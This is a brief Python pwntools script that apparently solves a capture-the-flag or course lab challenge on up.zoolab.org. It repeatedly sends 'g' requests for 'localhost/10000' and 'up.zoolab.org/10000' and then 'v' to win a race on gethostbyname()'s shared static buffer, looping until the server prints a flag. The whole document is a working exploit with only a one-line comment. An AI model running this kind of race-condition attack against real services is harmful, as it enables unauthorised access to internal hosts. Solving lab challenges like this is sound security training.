#!/usr/bin/python3

# gethostbyname() points to a static memory. So the return value might be changed!!!

from pwn import *

found = False

conn = remote('up.zoolab.org', 10932)

while not found:
    conn.sendline(b'g')
    conn.sendline(b'localhost/10000')
    conn.sendline(b'g')
    conn.sendline(b'up.zoolab.org/10000')
    conn.sendline(b'v')

    #for i in range(5):
    res = conn.recvline().decode('ascii')
    if 'FLAG{' in res: 
        print(res)
        found = True

